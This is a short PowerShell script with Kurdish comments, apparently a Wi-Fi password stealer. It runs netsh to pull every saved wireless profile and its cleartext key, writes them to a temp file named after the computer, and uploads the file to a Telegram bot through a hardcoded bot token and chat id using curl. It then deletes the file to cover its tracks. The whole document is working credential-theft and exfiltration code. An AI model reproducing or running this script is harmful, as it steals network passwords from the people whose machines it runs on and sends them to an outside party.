$compName = $env:COMPUTERNAME
$token = "8055439877:AAHqPyyYm79putLyxCDa3bED7KHTdWo1T80"
$id = "8597805144"
$fileName = "$($compName)_wifi.txt"
$p = "$env:TEMP\$fileName"

if (Test-Path $p) { rm $p -Force }

# وەرگرتنی لیستی هەموو پرۆفایلەکان بە وردی
$profiles = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

foreach ($n in $profiles) {
    # هێنانی زانیاری هەر وایفایەک
    $c = netsh wlan show profile name="$n" key=clear
    # گەڕان بەدوای پاسوۆرد بە شێوازی جیاواز بۆ ئەوەی هیچی لەدەست نەچێت
    $m = $c | Select-String "Key Content\W+\:(.+)$"
    
    if ($m) {
        $pass = $m.Matches.Groups[1].Value.Trim()
        "$n : $pass" | Out-File $p -Append -Encoding utf8
    } else {
        # ئەگەر پاسوۆردی نەبوو (Open WiFi)، دەتوانیت ئەم دێڕە لادەیت ئەگەر نەتویست
        # "$n : [No Password]" | Out-File $p -Append -Encoding utf8
    }
}

if (Test-Path $p) {
    # دڵنیابوونەوە لەوەی فایلەکە داخراوە پێش ناردن
    Start-Sleep -Seconds 1
    curl.exe -L -F "document=@$p" "https://api.telegram.org/bot$token/sendDocument?chat_id=$id"
    rm $p -Force
}

exit
